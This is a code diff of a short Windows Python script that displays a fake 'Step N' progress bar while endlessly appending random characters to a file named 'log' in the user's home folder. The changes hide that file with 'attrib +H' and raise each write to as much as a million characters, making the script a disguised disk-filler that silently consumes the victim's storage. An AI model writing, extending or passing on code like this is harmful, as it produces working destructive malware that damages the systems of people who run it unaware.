@@ -1,13 +1,16 @@
-import getpass, random, os, string, sys
+import getpass, random, os, string, subprocess
 os.system('color 0a')
 cls = lambda: os.system('cls')
+path = f'C:\\Users\\{getpass.getuser()}\\log'
+file = open(path, 'a')
+subprocess.check_call(['attrib', '+H', path])
 step = 1
 percent = 0
 while True:
 	cls()
 	num = round(percent / 5)
 	print(f'''\nStep {step}\n[{'-' * num}{' ' * (20 - num)}] {percent}%''')
-	open(f'C:\\Users\\{getpass.getuser()}\\log', 'a').write(''.join(f'{random.choice(string.printable)}' for _ in range(10000)))
+	file.write(''.join(f'{random.choice(string.printable)}' for _ in range(random.randint(10000, 1000000))))
 	percent += 1
 	if percent > 100:
 		percent = 0
